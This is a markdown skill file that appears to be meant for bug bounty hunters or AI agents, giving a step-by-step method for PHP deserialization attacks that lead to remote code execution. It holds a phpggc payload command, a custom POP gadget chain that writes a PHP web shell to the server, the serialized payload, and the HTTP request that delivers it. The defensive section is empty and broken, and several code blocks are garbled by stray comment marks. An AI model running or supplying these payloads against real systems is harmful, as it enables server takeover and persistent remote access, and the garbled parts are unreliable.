---
name: php-deserialization-rce
description: >
  Exploit PHP object serialization vulnerabilities (Insecure Deserialization). This skill 
  details how to identify unserialize() injection points and construct malicious serialized 
  objects using Property Oriented Programming (POP) chains to achieve Remote Code Execution (RCE).
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: advanced
estimated_time: "3-4 hours"
mitre_attack:
  tactics: [TA0001, TA0002]
  techniques: [T1190, T1059]
platforms: [web, php]
tags: [php, deserialization, rce, object-injection, pop-chains, phpgcc, web-vulnerabilities]
tools: [burp-suite, phpggc]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# PHP Deserialization to RCE

## When to Use
- During a web application assessment where user-supplied input is passed to PHP's `unserialize()` function.
- Often found in base64-encoded or URL-encoded cookies, hidden form fields, or API endpoints handling legacy architecture.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying the Sink

Look for patterns indicating serialized PHP objects Prefixes like `O:4:"User":2:{...}`
- Search source code for `unserialize($_GET['data'])` or `unserialize(base64_decode($_COOKIE['session']))`

```php
// Vulnerable Code Example $input = $_GET['payload'];
$obj = unserialize($input); // DANGER
```

### Phase 2: Utilizing PHPGGC (PHP Generic Gadget Chains)

If the target is using known frameworks/libraries (e.g., Laravel, Symfony, Monolog, SwiftMailer), you can generate a POP chain payload automatically.

```bash
# phpggc -l # List available gadget chains

# Generate a payload for Laravel/RCE1 to execute 'id' phpggc Laravel/RCE1 system 'id' --base64
```

### Phase 3: Writing a Custom Gadget Chain

If standard framework gadgets aren't available, you must review the source code for class definitions containing "Magic Methods" (e.g., `__wakeup()`, `__destruct()`, `__toString()`).

```php
# class Logger {
    public $logFile;
    public $initMsg;

    public function __destruct() {
        file_put_contents($this->logFile, $this->initMsg);
    }
}

// Crafting the payload $payload = new Logger();
$payload->logFile = "/var/www/html/shell.php";
$payload->initMsg = "<?php system($_GET['cmd']); ?>";
echo serialize($payload);
// Output: O:6:"Logger":2:{s:7:"logFile";s:23:"/var/www/html/shell.php";s:7:"initMsg";s:30:"<?php system($_GET['cmd']); ?>";}
```

### Phase 4: Executing the Attack

Submit the serialized payload (URL-encoded or Base64-encoded if necessary) to the vulnerable endpoint.

```http
# GET /vulnerable.php?payload=O:6:"Logger":2:{s:7:"logFile";s:23:"/var/www/html/shell.php";s:7:"initMsg";s:30:"<?php system($_GET['cmd']); ?>";} HTTP/1.1
Host: target.app
```
Access `shell.php?cmd=id`.

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify unserialize() Sink ] --> B{Dependencies Known? ]}
    B -->|Yes| C[Generate PHPGGC Payload ]
    B -->|No| D[Audit Source for Magic Methods ]
    C --> E[Inject and Execute ]
    D --> E
```


## 🔵 Blue Team Detection & Defense
- **Avoid unserialize() on untrusted data**: **Use JSON Encoding**: **WAF Rules against Gadget Payloads**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Php Deserialization Rce — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- OWASP: [Deserialization of untrusted data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
- PHPGGC Tool: [GitHub - ambionics/phpggc](https://github.com/ambionics/phpggc)
